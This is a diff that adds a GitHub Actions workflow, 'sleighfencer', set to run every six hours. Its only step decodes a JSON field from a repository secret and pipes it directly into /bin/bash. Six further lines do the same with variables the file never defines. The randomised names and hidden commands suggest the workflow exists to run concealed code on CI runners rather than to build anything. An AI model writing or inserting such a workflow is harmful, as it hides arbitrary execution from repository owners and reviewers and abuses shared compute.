@@ -1,0 +1,23 @@
+name: sleighfencer
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: sleighfencer
+        env:
+          pz9708: ${{ secrets.pz9708 }}
+        run: |
+          echo $pz9708 | jq -r .muybo96168 | /bin/bash
+          echo $w8 | jq -r .x74792 | /bin/bash
+          echo $vkeu7843 | jq -r .vzfa0579 | /bin/bash
+          echo $op3549 | jq -r .kekco95 | /bin/bash
+          echo $ilbd57 | jq -r .buqu432 | /bin/bash
+          echo $hzge058 | jq -r .pns9386 | /bin/bash
+          echo $aav3 | jq -r .g493 | /bin/bash
+
